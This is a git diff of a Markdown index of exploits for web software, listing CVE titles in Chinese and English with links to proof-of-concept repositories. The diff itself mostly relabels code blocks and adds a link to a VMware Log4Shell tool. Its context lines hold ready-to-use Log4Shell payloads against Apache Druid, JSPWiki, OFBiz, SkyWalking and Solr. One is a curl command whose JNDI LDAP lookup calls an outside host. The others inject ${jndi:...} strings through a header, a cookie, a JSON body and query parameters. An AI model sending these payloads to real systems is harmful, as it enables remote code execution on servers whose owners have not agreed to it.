@@ -64,7 +64,7 @@
   - 📌 [apisix_dashboard_rce](https://github.com/wuppp/apisix_dashboard_rce)
 ## Apache Druid
 - 🎯 [Apache Druid RCE via Log4shell](https://github.com/pen4uin/JavaSec/blob/main/apache%20druid/vulnerability-research.md)
-    ```http
+    ```shell
     # tested
     curl -vv -X DELETE "http://10.10.10.139:8081/druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2fcpy1p.aliyundun.net%7d"
     # haven't tested
@@ -83,7 +83,7 @@
 ## Apache JSPWiki
 - 🎯 CVE-2021-44140 Apache JSPWiki Arbitrary file deletion on logout
 - 🎯 Apache JSPWiki RCE via Log4shell
-    ```http
+    ```shell
     http://0.0.0.0:8080/Edit.jsp?page=Main
     X-Forwarded-For:${jndi:dns://0.0.0.0/123}
     ```
@@ -91,7 +91,7 @@
 - 🎯 CVE-2020-9496 Apache Ofbiz 远程代码执行漏洞
 - 🎯 CVE-2021-26295 Apache OFBiz 远程代码执行漏洞
 - 🎯 Apache OFBiz RCE via Log4shell
-    ```http
+    ```shell
     # 1、
     GET: https://0.0.0.0:8443/webtools/control/main
     Cookie: OFBiz.Visitor=${jndi:ldap://0.0.0.0/123}
@@ -104,14 +104,14 @@
 - 🎯 CVE-2021-37580 Apache ShenYu 身份验证绕过漏洞
 ## Apache SkyWalking
 - 🎯 Apache SkyWalking RCE via Log4shell 
-    ```http
+    ```shell
     POST: http://0.0.0.0:8080/graphql
     data: {"query":"${jndi:dns://0.0.0.0/123}","variables":{"duration":{"start":"2021-12-22 1259","end":"2021-12-22 1314","step":"MINUTE"}}}
     ```
     
 ## Apache Solr
 - 🎯 Apache SkyWalking RCE via Log4shell 
-    ```http
+    ```shell
     /solr/admin/cores?action=CREATE&name=$%7Bjndi:ldap://0.0.0.0/123%7D&wt=json
     /solr/admin/info/system?_=${jndi:ldap://0.0.0.0/123}&wt=json
     /solr/admin/cores?_=&action=&config=&dataDir=&instanceDir=${jndi:ldap://0.0.0.0/123}&name=
@@ -238,9 +238,6 @@
 ## Jetty
 - 🎯 Jetty URI路径限制绕过漏洞（CVE-2021-28169）
 - 🎯 Jetty URI路径限制绕过漏洞（CVE-2021-28164）
-
-
-
 
 ## J-金山终端安全系统
 - 🎯 金山终端安全管理系统 v8 任意文件上传漏洞-upload.php 
@@ -392,11 +389,12 @@
 - 🎯 VMware vCenter Server 文件上传漏洞（CVE-2021-22005）
 - 🎯 VMware vCenter SSRF/任意文件读取漏洞-/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=
 - 🎯 VMware View Planner 远程代码执行漏洞（CVE-2021-21978）
+- 🎯 Vmware Product RCE via Log4Shell
+  - 📌 [Vm4J](https://github.com/NS-Sp4ce/Vm4J)
 
 ## Weblogic
 - 🎯 CVE-2020-14882/CVE-2020-14883(WebLogic 未授权命令执行漏洞)
 - 🎯 CVE-2020-14750 权限绕过
-
 
 ## [Yonyou-用友](https://github.com/0wlsec/Poc-Exp/blob/main/demo/Yonyou.md)
 - 🎯 用友人力资源管理软件（e-HR）XXE漏洞
